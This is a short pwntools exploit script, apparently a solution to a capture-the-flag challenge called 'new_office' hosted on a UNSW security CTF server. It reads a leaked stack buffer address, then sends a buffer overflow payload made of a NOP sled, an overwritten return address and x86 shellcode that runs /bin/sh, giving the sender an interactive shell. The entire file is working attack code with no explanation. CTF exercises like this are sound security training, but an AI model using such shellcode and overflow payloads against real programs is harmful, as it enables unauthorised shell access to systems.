from pwn import *

remote_conn = False

IP = "pwn.ctf.unswsecurity.com"
PORT = "5001"
FILENAME = "./_ctfd/files/new_office"


if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

shellcode = asm('''
xor eax, eax
push eax

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov edx, ecx

mov eax, 0xb
int 0x80
''')

p.recvuntil("is at: ")
buff_addr = int(p.recvline()[:-1], 16) + 100
buff_addr = pack(buff_addr)
log.info(str(buff_addr))

payload = b"\x90"*62 + buff_addr + b"\x90"*500 + shellcode
p.sendline(payload)

p.interactive()
